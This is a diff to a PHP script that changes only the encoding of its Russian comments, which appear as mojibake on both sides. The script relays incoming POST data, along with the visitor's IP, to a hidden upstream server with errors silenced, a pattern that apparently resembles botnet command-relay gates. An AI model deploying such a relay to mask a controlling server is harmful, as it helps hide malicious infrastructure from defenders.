@@ -1,18 +1,18 @@
 <?php
-//URL Ð¾Ñ€Ð¸Ð³Ð¸Ð½Ð°Ð»ÑŒÐ½Ð¾Ð³Ð¾ ÑÐµÑ€Ð²ÐµÑ€Ð°.
+//URL îðèãèíàëüíîãî ñåðâåðà.
 $url = "http://localhost/s.php";
 
 @error_reporting(0); @set_time_limit(0);
 
-//ÐšÐ¾Ð½Ð½ÐµÐºÑ‚Ð¸Ð¼ÑÑ Ðº Ð¾Ñ€Ð¸Ð³Ð¸Ð½Ð°Ð»ÑŒÐ½Ð¾Ð¼Ñƒ ÑÐµÑ€Ð²ÐµÑ€Ñƒ.
+//Êîííåêòèìñÿ ê îðèãèíàëüíîìó ñåðâåðó.
 $url = @parse_url($url);
 if(!isset($url['port']))$url['port'] = 80; 
 if(($real_server = @fsockopen($url['host'], $url['port'])) === false)die('E1');
 
-//ÐŸÐ¾Ð»ÑƒÑ‡Ð°ÐµÐ¼ Ð´Ð°Ð½Ð½Ñ‹Ðµ Ð´Ð»Ñ Ð¿ÐµÑ€ÐµÑÑ‹Ð»ÐºÐ¸.
+//Ïîëó÷àåì äàííûå äëÿ ïåðåñûëêè.
 if(($data = @file_get_contents('php://input')) === false)$data = '';
 
-//Ð¤Ð¾Ñ€Ð¼Ð¸Ñ€ÑƒÐµÐ¼ Ð·Ð°Ð¿Ñ€Ð¾Ñ.
+//Ôîðìèðóåì çàïðîñ.
 $request  = "POST {$url['path']}?ip=".urlencode($_SERVER['REMOTE_ADDR'])." HTTP/1.1\r\n";
 $request .= "Host: {$url['host']}\r\n";
 
@@ -22,14 +22,14 @@ if(!empty($_SERVER['HTTP_USER_AGENT']))$request .= "User-Agent: {$_SERVER['HTTP_
 $request .= "Content-Length: ".strlen($data)."\r\n";
 $request .= "Connection: Close\r\n";
 
-//ÐžÑ‚Ð¿Ñ€Ð°Ð²Ð»ÑÐµÐ¼.
+//Îòïðàâëÿåì.
 fwrite($real_server, $request."\r\n".$data);
 
-//ÐŸÐ¾Ð»ÑƒÑ‡Ð°ÐµÐ¼ Ð¾Ñ‚Ð²ÐµÑ‚.
+//Ïîëó÷àåì îòâåò.
 $result = '';
 while(!feof($real_server))$result .= fread($real_server, 1024);
 fclose($real_server);
 
-//Ð’Ñ‹Ð²Ð¾Ð´Ð¸Ð¼ Ð¾Ñ‚Ð²ÐµÑ‚.
+//Âûâîäèì îòâåò.
 echo substr($result, strpos($result, "\r\n\r\n") + 4);
 ?>
